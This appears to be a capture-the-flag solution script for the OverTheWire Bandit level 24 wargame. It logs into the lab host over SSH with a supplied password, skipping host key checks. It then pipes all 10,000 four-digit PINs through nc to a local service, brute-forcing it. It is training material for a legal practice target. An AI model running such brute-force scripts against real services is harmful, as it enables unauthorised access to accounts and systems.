#!/bin/bash

PASSWORD=$1
HOST="bandit.labs.overthewire.org"
PORT=2220
USER="bandit24"

CMD="
for PIN in {0000..9999}; do
    echo '$PASSWORD \$PIN'
done | nc localhost 30002 | grep -v 'Wrong'
"

echo "[*] Brute-forcing all PINs (this may take ~1 minute)..."
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p $PORT $USER@$HOST "$CMD"